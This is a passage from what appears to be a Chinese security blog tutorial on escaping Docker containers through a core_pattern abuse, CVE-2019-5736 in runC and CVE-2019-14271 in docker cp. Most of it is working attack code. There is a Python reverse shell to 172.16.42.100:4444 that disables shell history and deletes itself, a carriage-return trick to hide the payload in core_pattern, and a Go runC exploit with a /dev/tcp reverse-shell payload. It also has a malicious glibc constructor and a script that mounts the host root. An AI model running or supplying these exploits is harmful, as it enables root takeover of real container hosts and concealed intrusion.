os.putenv(<span class="string">&quot;HISTFILE&quot;</span>, <span class="string">&#x27;/dv/null&#x27;</span>)</span><br><span class="line">    pty.spawn(<span class="string">&quot;/bin/bash&quot;</span>)</span><br><span class="line">    os.remove(<span class="string">&#x27;/tmp/.x.py&#x27;</span>)</span><br><span class="line">    s.close()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>将其写入到/tmp/.x.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cat &lt;&lt;EOF | tee /tmp/.x.py</span><br><span class="line"><span class="comment">#!/bin/python</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pty</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">lhost = <span class="string">&quot;172.16.42.100&quot;</span></span><br><span class="line">lport = <span class="number">4444</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((lhost, lport))</span><br><span class="line">    os.dup2(s.fileno(), <span class="number">0</span>)</span><br><span class="line">    os.dup2(s.fileno(), <span class="number">1</span>)</span><br><span class="line">    os.dup2(s.fileno(), <span class="number">2</span>)</span><br><span class="line">    os.putenv(<span class="string">&quot;HISTFILE&quot;</span>, <span class="string">&#x27;/dev/null&#x27;</span>)</span><br><span class="line">    pty.spawn(<span class="string">&quot;/bin/bash&quot;</span>)</span><br><span class="line">    os.remove(<span class="string">&#x27;/tmp/.x.py&#x27;</span>)</span><br><span class="line">    s.close()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure>

<p>==给python脚本添加权限：chmod 777 /tmp/.x.py==</p>
</li>
<li><p>攻击机监听</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lvvp <span class="number">4444</span></span><br></pre></td></tr></table></figure></li>
<li><p>靶机执行最终payload</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">echo -e <span class="string">&quot;|/var/lib/docker/overlay2/a8c0d9490cd90b318c19ff03fd9d1d566bd234ebcb4554b3e58f5aaef1a16206/merged/tmp/.x.py core&quot;</span> &gt;&gt; <span class="regexp">/host_proc/</span>sys<span class="regexp">/kernel/</span>core_pattern</span><br></pre></td></tr></table></figure></li>
<li><p>触发payload</p>
<p>执行一个导致崩溃的程序</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> *a = <span class="literal">NULL</span>;</span><br><span class="line">    *a = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc a.c -o a</span><br><span class="line">./a</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@ed4a9a47d52f:/tmp<span class="comment"># ./a</span></span><br><span class="line">Segmentation fault (core dumped)</span><br></pre></td></tr></table></figure>

<p>就会触发执行, 攻击机收到反弹的shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@master ~]<span class="comment"># nc -lvvp 4444</span></span><br><span class="line">Ncat: Version 7.50 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::4444</span><br><span class="line">Ncat: Listening on 0.0.0.0:4444</span><br><span class="line">Ncat: Connection from 172.16.42.151.</span><br><span class="line">Ncat: Connection from 172.16.42.151:37356.</span><br><span class="line">root@vuln:/<span class="comment">#</span></span><br></pre></td></tr></table></figure></li>
<li><p>payload优化</p>
<p>为了隐藏我们的payload，我们做一些修改</p>
<p>当前：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@ed4a9a47d52f:/tmp<span class="comment"># cat /host_proc/sys/kernel/core_pattern</span></span><br><span class="line">|/var/lib/docker/overlay2/a8c0d9490cd90b318c19ff03fd9d1d566bd234ebcb4554b3e58f5aaef1a16206/merged/tmp/.x.py core</span><br></pre></td></tr></table></figure>

<p>由于core_pattern固定字节长度我们可以用/r来覆盖真实的地址</p>
<p>加入几个空格后的payload:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;|/var/lib/docker/overlay2/a8c0d9490cd90b318c19ff03fd9d1d566bd234ebcb4554b3e58f5aaef1a16206/merged/tmp/.x.py \rcore         &quot;</span> &gt; /host_proc/sys/kernel/core_pattern</span><br></pre></td></tr></table></figure>

<p>达到混淆的效果:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@ed4a9a47d52f:/tmp<span class="comment"># cat /host_proc/sys/kernel/core_pattern</span></span><br><span class="line">core         ker/overlay2/a8c0d9490cd90b318c19ff03fd9d1d566bd234ebcb4554b3e58f5aaef1a16206/merged/tmp/.x.p</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="3-利用程序漏洞进行逃逸"><a href="#3-利用程序漏洞进行逃逸" class="headerlink" title="3. 利用程序漏洞进行逃逸"></a>3. 利用程序漏洞进行逃逸</h2><p>我们可以利用容器生态中相关服务端、客户端程序自身存在漏洞进行逃逸</p>
<h3 id="3-1-容器运行时"><a href="#3-1-容器运行时" class="headerlink" title="3.1 容器运行时"></a>3.1 容器运行时</h3><p>容器运行时负责管理容器运行的整个生命周期，包括但不限于指定容器镜像格式、构建镜像、上传和拉去镜像、管理镜像、管理容器实例、运行容器等。在容器运行早期，Docker作为容器运行时的标准被广泛使用，而后由google、CoreOS、Docker等公司在2015年联合创建了开放容器标准（Open Container Initiative， OCI）,用于推进容器标准化，其主要包含两个标准，分别为容器运行时标准和容器镜像标准，OCI的容器运行时主要包括runC、Rocket、Kata Containers、gVisor等。再后来随着容器编排技术的发展，Kubernetes推出了容器运行时接口(Container Runtime Interface, CRI)，用于与容器运行时进行通讯，从而操作容器化程序。</p>
<h3 id="3-2-runC"><a href="#3-2-runC" class="headerlink" title="3.2 runC"></a>3.2 runC</h3><p>runC是一个遵循OCI标准的用来运行容器的命令行工具(CLI Tool)，它也是一个Runtime的实现</p>
<p>当我们执行docker info的时候，就可以看见如下内容</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  ~ docker info</span><br><span class="line">......</span><br><span class="line"> Runtimes: io.containerd.runc.v2 io.containerd.runtime.v1.linux runc</span><br><span class="line"> Default Runtime: runc</span><br><span class="line"> ......</span><br></pre></td></tr></table></figure>

<p><code>runC</code>不仅可以被<code>docker engine</code>使用，它也可以单独使用(它本身就是命令行工具)。</p>
<h3 id="3-3-CVE-2019-5736-runc容器逃逸漏洞"><a href="#3-3-CVE-2019-5736-runc容器逃逸漏洞" class="headerlink" title="3.3 CVE-2019-5736 runc容器逃逸漏洞"></a>3.3 CVE-2019-5736 runc容器逃逸漏洞</h3><p><strong>影响版本：</strong></p>
<p>Docker  &lt; 18.09.2</p>
<p>runC &lt;= 1.0-rc6</p>
<p>runC是Docker内置的一个基础客户端工具，在存在漏洞版本的docker中，容器内部通过proc虚拟文件系统访问到runc文件并写入恶意代码，怎么触发呢？触发使用到了proc目录下的/proc/PID/exe，它指向进程自身对应的本地文件。比如如果我们使用docker exec -it /bin/sh，如果我们替换掉容器里的/bin/sh为/proc/[runC-PID]/exe，那么就会调用我们刚刚写入恶意代码的runc，导致恶意命令被执行，由于runc是在docker守护进程里具有宿主机的root权限，相当于逃逸了容器。</p>
<p><strong>环境搭建：</strong></p>
<p>使用<a href="https://github.com/Metarget/metarget/blob/master/README-zh.md">metarget</a>搭建环境(注：要在ubuntu下使用)</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">sudo</span> ./metarget cnv install cve-<span class="number">2019</span>-<span class="number">5736</span></span><br></pre></td></tr></table></figure>

<p>安装好后我们查看docker和runC版本</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">shadowflow@ubuntu:~/metarget$ docker version</span><br><span class="line">Client:</span><br><span class="line"> Version:      18.03.1-ce</span><br><span class="line"> API version:  1.37</span><br><span class="line"> Go version:   go1.9.5</span><br><span class="line"> Git commit:   9ee9f40</span><br><span class="line"> Built:        Wed Jun 20 21:43:51 2018</span><br><span class="line"> OS/Arch:      linux/amd64</span><br><span class="line"></span><br><span class="line">shadowflow@ubuntu:~/metarget$ docker-runc --version</span><br><span class="line">runc version 1.0.0-rc5</span><br><span class="line">commit: 4fc53a81fb7c994640722ac585fa9ca548971871</span><br><span class="line">spec: 1.0.0</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>下载<a href="https://github.com/Frichetten/CVE-2019-5736-PoC">poc</a>，修改payload为反弹shell。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="comment">// Implementation of CVE-2019-5736</span></span><br><span class="line"><span class="comment">// Created with help from @singe, @_cablethief, and @feexd.</span></span><br><span class="line"><span class="comment">// This commit also helped a ton to understand the vuln</span></span><br><span class="line"><span class="comment">// https://github.com/lxc/lxc/commit/6400238d08cdf1ca20d49bafb85f4e224348bf9d</span></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line">	<span class="string">&quot;os&quot;</span></span><br><span class="line">	<span class="string">&quot;strconv&quot;</span></span><br><span class="line">	<span class="string">&quot;strings&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// This is the line of shell commands that will execute on the host</span></span><br><span class="line"><span class="comment">//var payload = &quot;#!/bin/bash \n cat /etc/shadow &gt; /tmp/shadow &amp;&amp; chmod 777 /tmp/shadow&quot;</span></span><br><span class="line"><span class="keyword">var</span> payload = <span class="string">&quot;#!/bin/bash \n bash -i &gt;&amp; /dev/tcp/172.16.42.100/4444 0&gt;&amp;1&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// First we overwrite /bin/sh with the /proc/self/exe interpreter path</span></span><br><span class="line">	fd, err := os.Create(<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Fprintln(fd, <span class="string">&quot;#!/proc/self/exe&quot;</span>)</span><br><span class="line">	err = fd.Close()</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(<span class="string">&quot;[+] Overwritten /bin/sh successfully&quot;</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Loop through all processes to find one whose cmdline includes runcinit</span></span><br><span class="line">	<span class="comment">// This will be the process created by runc</span></span><br><span class="line">	<span class="keyword">var</span> found <span class="keyword">int</span></span><br><span class="line">	<span class="keyword">for</span> found == <span class="number">0</span> &#123;</span><br><span class="line">		pids, err := ioutil.ReadDir(<span class="string">&quot;/proc&quot;</span>)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			fmt.Println(err)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span> _, f := <span class="keyword">range</span> pids &#123;</span><br><span class="line">			fbytes, _ := ioutil.ReadFile(<span class="string">&quot;/proc/&quot;</span> + f.Name() + <span class="string">&quot;/cmdline&quot;</span>)</span><br><span class="line">			fstring := <span class="keyword">string</span>(fbytes)</span><br><span class="line">			<span class="keyword">if</span> strings.Contains(fstring, <span class="string">&quot;runc&quot;</span>) &#123;</span><br><span class="line">				fmt.Println(<span class="string">&quot;[+] Found the PID:&quot;</span>, f.Name())</span><br><span class="line">				found, err = strconv.Atoi(f.Name())</span><br><span class="line">				<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">					fmt.Println(err)</span><br><span class="line">					<span class="keyword">return</span></span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// We will use the pid to get a file handle for runc on the host.</span></span><br><span class="line">	<span class="keyword">var</span> handleFd = <span class="number">-1</span></span><br><span class="line">	<span class="keyword">for</span> handleFd == <span class="number">-1</span> &#123;</span><br><span class="line">		<span class="comment">// Note, you do not need to use the O_PATH flag for the exploit to work.</span></span><br><span class="line">		handle, _ := os.OpenFile(<span class="string">&quot;/proc/&quot;</span>+strconv.Itoa(found)+<span class="string">&quot;/exe&quot;</span>, os.O_RDONLY, <span class="number">0777</span>)</span><br><span class="line">		<span class="keyword">if</span> <span class="keyword">int</span>(handle.Fd()) &gt; <span class="number">0</span> &#123;</span><br><span class="line">			handleFd = <span class="keyword">int</span>(handle.Fd())</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(<span class="string">&quot;[+] Successfully got the file handle&quot;</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Now that we have the file handle, lets write to the runc binary and overwrite it</span></span><br><span class="line">	<span class="comment">// It will maintain it&#x27;s executable flag</span></span><br><span class="line">	<span class="keyword">for</span> &#123;</span><br><span class="line">		writeHandle, _ := os.OpenFile(<span class="string">&quot;/proc/self/fd/&quot;</span>+strconv.Itoa(handleFd), os.O_WRONLY|os.O_TRUNC, <span class="number">0700</span>)</span><br><span class="line">		<span class="keyword">if</span> <span class="keyword">int</span>(writeHandle.Fd()) &gt; <span class="number">0</span> &#123;</span><br><span class="line">			fmt.Println(<span class="string">&quot;[+] Successfully got write handle&quot;</span>, writeHandle)</span><br><span class="line">			writeHandle.Write([]<span class="keyword">byte</span>(payload))</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译poc:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build main.go</span><br></pre></td></tr></table></figure>

<p><strong>启动一个容器：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo docker run -it --name debian --rm debian /bin/bash</span><br></pre></td></tr></table></figure>

<p><strong>将poc复制到容器内并运行：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker cp main debian:/main</span><br><span class="line"></span><br><span class="line"><span class="comment">#容器内运行</span></span><br><span class="line">/main</span><br></pre></td></tr></table></figure>

<p><strong>启动监听：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvvp 4444</span><br></pre></td></tr></table></figure>

<p><strong>模拟宿主机进入容器：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -it debian /bin/sh</span><br></pre></td></tr></table></figure>

<p><em>注：这里我进入的时候第一次用/bin/sh，才行，后面用/bin/bash也可以</em></p>
<p><strong>结果：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@master ~]<span class="comment"># nc -lvvp 4444</span></span><br><span class="line">Ncat: Version 7.50 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::4444</span><br><span class="line">Ncat: Listening on 0.0.0.0:4444</span><br><span class="line">Ncat: Connection from 172.16.42.181.</span><br><span class="line">Ncat: Connection from 172.16.42.181:53510.</span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal process group (1212): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line">root@ubuntu:/<span class="comment"># id</span></span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure>



<h3 id="3-4-CVE-2018-15664-符号链接替换漏洞"><a href="#3-4-CVE-2018-15664-符号链接替换漏洞" class="headerlink" title="3.4 CVE-2018-15664:符号链接替换漏洞"></a>3.4 CVE-2018-15664:符号链接替换漏洞</h3><p>影响版本：Docker &lt; 18.06.1-ce-rc2</p>
<p>CVE-2018-15664是一个条件竞争引起的漏洞，当用户执行docker cp命令的时候Docker守护进程会先检查复制的路径，检查的时候如果有容器内部的符号链接，会先解析符号链接，然后放置，等待检查完后进行复制操作。这其中存在一个间隙，如果我们在执行检查之后复制之前，将执行容器内已经解析成路径的符号链接再次替换成一个符号链接，那么复制的时候，宿主机的docker守护进程就会解析的这个符号链接，就会以docker守护进程的权限把容器内的文件复制到宿主机，这个漏洞比较鸡肋。攻击场景局限在非root用户的宿主机权限，并且有docker交互的权限，这时候可以使用这个方法修改/etc/shadow文件实现提权，并且由于需要条件竞争成功率并不高。如果有了这些权限完全可以启动一个特权容器进行逃逸。由于利用条件过于苛刻，实际价值不大，这里不做复现。</p>
<h3 id="3-5-CVE-2019-14271-加载不受信任的动态链接"><a href="#3-5-CVE-2019-14271-加载不受信任的动态链接" class="headerlink" title="3.5 CVE-2019-14271:加载不受信任的动态链接"></a>3.5 CVE-2019-14271:加载不受信任的动态链接</h3><p>影响版本 Docker 19.03.x 和若干非正式版</p>
<p>在存在漏洞版本的Docker中，在执行Docker cp命令后，Docker守护进程会启动一个docker-tar进程来完成这项复制任务。docker-tar会在容器里执行chroot后加载一些动态链接库，如果我们在容器里放置恶意的动态链接库，就会被加载到容器外的docker-tar(root权限)运行。</p>
<p><strong>环境搭建：</strong></p>
<figure class="highlight subunit"><table><tr><td class="code"><pre><span class="line">./metarget cnv install cve<span class="string">-2019</span><span class="string">-14271</span></span><br></pre></td></tr></table></figure>

<p><strong>确定目标：</strong></p>
<p>如何找出docker-tar启动后会加载的容器内动态链接库呢？最直接的是分析docker源码，但是比较费时间；另一种思路是执行一次docker cp命令，观察在这个过程中容器内部哪些动态链接库被加载了。我们采用第二种方式，需要使用inotify机制，用来监控文件系统变化。</p>
<ol>
<li><p>启动一个容器：</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">sudo docker <span class="builtin-name">run</span> -itd <span class="attribute">--name</span>=test ubuntu</span><br></pre></td></tr></table></figure></li>
<li><p>确定容器绝对路径：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">shadowflow@ubuntu:~/metarget$ sudo docker <span class="built_in">exec</span> -it <span class="built_in">test</span> cat /proc/mounts | grep docker</span><br><span class="line">overlay / overlay rw,relatime,lowerdir=/var/lib/docker/overlay2/l/OPYJT6AWT3IWJEPHAFYV5KJZCN:/var/lib/docker/overlay2/l/E4IQFOCWDQVZR3SHN5ZEMRI2ZX,upperdir=/var/lib/docker/overlay2/90cb520a4b6ef60f15fcc1b962328150829c0e5fb7c1ecc72f82dfce3d7ff874/diff,workdir=/var/lib/docker/overlay2/90cb520a4b6ef60f15fcc1b962328150829c0e5fb7c1ecc72f82dfce3d7ff874/work,xino=off 0 0</span><br></pre></td></tr></table></figure>

<p>根据上文信息收集的内容，可以确定容器根目录为<code>/var/lib/docker/overlay2/90cb520a4b6ef60f15fcc1b962328150829c0e5fb7c1ecc72f82dfce3d7ff874/merged</code></p>
</li>
<li><p>使用inotifywait工具监听容器</p>
<p>在另一个终端执行监听容器内的lib目录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">shadowflow@ubuntu:~/metarget$ sudo apt install -y inotify-tools</span><br><span class="line">[sudo] password <span class="keyword">for</span> shadowflow: </span><br><span class="line">Reading package lists... Done</span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">shadowflow@ubuntu:~/metarget$ sudo inotifywait -mr /var/lib/docker/overlay2/90cb520a4b6ef60f15fcc1b962328150829c0e5fb7c1ecc72f82dfce3d7ff874/merged/lib/</span><br><span class="line">Setting up watches.  Beware: since -r was given, this may take a <span class="keyword">while</span>!</span><br><span class="line">Watches established.</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li><p>执行docker cp</p>
<p>在原来的终端执行docker cp</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">shadowflow@ubuntu:~/metarget$ sudo docker cp <span class="built_in">test</span>:/etc/passwd ./</span><br><span class="line">Error response from daemon: error processing tar file: docker-tar: relocation error: /lib/x86_64-linux-gnu/libnss_files.so.2: symbol __libc_readline_unlocked version GLIBC_PRIVATE not defined <span class="keyword">in</span> file libc.so.6 with link time reference</span><br><span class="line">: <span class="built_in">exit</span> status 127</span><br></pre></td></tr></table></figure>

<p>监控到以下输出</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">shadowflow@ubuntu:~/metarget$ sudo inotifywait -mr /var/lib/docker/overlay2/90cb520a4b6ef60f15fcc1b962328150829c0e5fb7c1ecc72f82dfce3d7ff874/merged/lib/</span><br><span class="line">Setting up watches.  Beware: since -r was given, this may take a <span class="keyword">while</span>!</span><br><span class="line">Watches established.</span><br><span class="line">/var/lib/docker/overlay2/90cb520a4b6ef60f15fcc1b962328150829c0e5fb7c1ecc72f82dfce3d7ff874/merged/lib/x86_64-linux-gnu/ OPEN libnss_files-2.31.so</span><br><span class="line">/var/lib/docker/overlay2/90cb520a4b6ef60f15fcc1b962328150829c0e5fb7c1ecc72f82dfce3d7ff874/merged/lib/x86_64-linux-gnu/ ACCESS libnss_files-2.31.so</span><br><span class="line">/var/lib/docker/overlay2/90cb520a4b6ef60f15fcc1b962328150829c0e5fb7c1ecc72f82dfce3d7ff874/merged/lib/x86_64-linux-gnu/ CLOSE_NOWRITE,CLOSE libnss_files-2.31.so</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我们可以看见docker-tar加载了libnss_files-2.31.so。那么我们就构造一个恶意的libnss_files-2.31.so来替换它。</p>
</li>
</ol>
<p><strong>构造动态链接库：</strong></p>
<p>先下载<a href="https://ftp.gnu.org/gnu/glibc/">Glibc库</a>，我这里下载2.31版本<a href="https://ftp.gnu.org/gnu/glibc/glibc-2.3.1.tar.gz%E3%80%82%E6%9C%80%E5%88%9D%E5%B0%9D%E8%AF%952.3.1%E5%9B%A0%E4%B8%BA%E5%92%8Cgcc%E7%89%88%E6%9C%AC%E5%92%8Cmake%E7%89%88%E6%9C%AC%E5%86%B2%E7%AA%81%E5%AF%BC%E8%87%B4%E7%BC%96%E8%AF%91%E4%B8%8D%E6%88%90%E5%8A%9F%EF%BC%8C%E6%8D%A2%E6%88%90%E4%BA%86%E3%80%8A%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%89%E5%85%A8%EF%BC%9A%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%E4%B8%8E%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA%E3%80%8B%E7%AB%8B%E7%9A%842.27%E7%89%88">https://ftp.gnu.org/gnu/glibc/glibc-2.3.1.tar.gz。最初尝试2.3.1因为和gcc版本和make版本冲突导致编译不成功，换成了《云原生安全：攻防实践与体系构建》立的2.27版</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">shadowflow@ubuntu:~$ mkdir ngu</span><br><span class="line">shadowflow@ubuntu:~$ <span class="built_in">cd</span> ngu</span><br><span class="line">shadowflow@ubuntu:~/ngu$ wget https://ftp.gnu.org/gnu/glibc/glibc-2.27.tar.bz2</span><br><span class="line">shadowflow@ubuntu:~/ngu$ tar -jxvf glibc-2.27.tar.bz2</span><br></pre></td></tr></table></figure>

<p>注释编译限制：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">shadowflow@ubuntu:~/ngu$ vim glibc-2.27/Makeconfig</span><br></pre></td></tr></table></figure>

<p>注释掉：</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">gccwarn-c</span> = -Wstrict-prototypes -Wold-style-definition</span><br></pre></td></tr></table></figure>

<p>添加恶意代码:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">shadowflow@ubuntu:~/ngu$ vim glibc-2.27/nss/nss_files/files-service.c</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// content should be added into nss/nss_files/files-service.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 容器内部原始 libnss_files.so.2 文件备份位置</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ORIGINAL_LIBNSS <span class="meta-string">&quot;/original_libnss_files.so.2&quot;</span></span></span><br><span class="line"><span class="comment">// 恶意 libnss_files.so.2 文件位置</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LIBNSS_PATH <span class="meta-string">&quot;/lib/x86_64-linux-gnu/libnss_files.so.2&quot;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">is_priviliged</span><span class="params">()</span></span>;</span><br><span class="line"> </span><br><span class="line">__attribute__ ((constructor)) <span class="function"><span class="keyword">void</span> <span class="title">run_at_link</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">     <span class="keyword">char</span> * argv_break[<span class="number">2</span>];</span><br><span class="line">  <span class="comment">// 判断是否容器外是高权限执行，即 docker-tar</span></span><br><span class="line">     <span class="keyword">if</span> (!is_priviliged())</span><br><span class="line">           <span class="keyword">return</span>;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 攻击执行一次即可，用原始的替换备份的库文件</span></span><br><span class="line">  <span class="comment">// 避免后续对环境产生影响</span></span><br><span class="line">     rename(ORIGINAL_LIBNSS, LIBNSS_PATH);</span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 以 docker-tar 运行 /breakout 恶意脚本</span></span><br><span class="line">  	<span class="keyword">if</span> (!fork()) &#123;</span><br><span class="line">        <span class="comment">// Child runs breakout</span></span><br><span class="line">        argv_break[<span class="number">0</span>] = strdup(<span class="string">&quot;/breakout&quot;</span>);</span><br><span class="line">        argv_break[<span class="number">1</span>] = <span class="literal">NULL</span>;</span><br><span class="line">        execve(<span class="string">&quot;/breakout&quot;</span>, argv_break, <span class="literal">NULL</span>);</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">else</span></span><br><span class="line">        wait(<span class="literal">NULL</span>); <span class="comment">// Wait for child</span></span><br><span class="line"> </span><br><span class="line">     <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">is_priviliged</span><span class="params">()</span> </span>&#123;</span><br><span class="line">     FILE * proc_file = fopen(<span class="string">&quot;/proc/self/exe&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">     <span class="keyword">if</span> (proc_file != <span class="literal">NULL</span>) &#123;</span><br><span class="line">           fclose(proc_file);</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">// can open so /proc exists, not privileged</span></span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">return</span> <span class="literal">true</span>; <span class="comment">// we&#x27;re running in the context of docker-tar</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">shadowflow@ubuntu:~/ngu$ mkdir glibc-build</span><br><span class="line">shadowflow@ubuntu:~/ngu$ <span class="built_in">cd</span> glibc-build/</span><br><span class="line">shadowflow@ubuntu:~/ngu/glibc-build$ sudo apt install bison</span><br><span class="line">shadowflow@ubuntu:~/ngu/glibc-build$ sudo apt install gawk</span><br><span class="line">shadowflow@ubuntu:~/ngu/glibc-build$ sudo ../glibc-2.27/configure --prefix=/home/shadowflow/gnu/glibc-build/configur1/</span><br><span class="line">shadowflow@ubuntu:~/ngu/glibc-build$ sudo make</span><br></pre></td></tr></table></figure>

<p>第一次编译比较慢，编译好后恶意文件为<code>~/ngu/glibc-build/nss/libnss_db.so</code></p>
<p>编写exp:</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">shadowflow<span class="variable">@ubuntu</span><span class="symbol">:~</span><span class="variable">$ </span>vim breakout</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">umount /host_fs &amp;&amp; rm -rf /host_fs</span><br><span class="line">mkdir /host_fs</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mount -t proc none /proc     # mount the host&#x27;s procfs over /proc</span><br><span class="line">cd /proc/1/root              # chdir to host&#x27;s root</span><br><span class="line">mount --bind . /host_fs      # mount host root at /host_fs</span><br></pre></td></tr></table></figure>

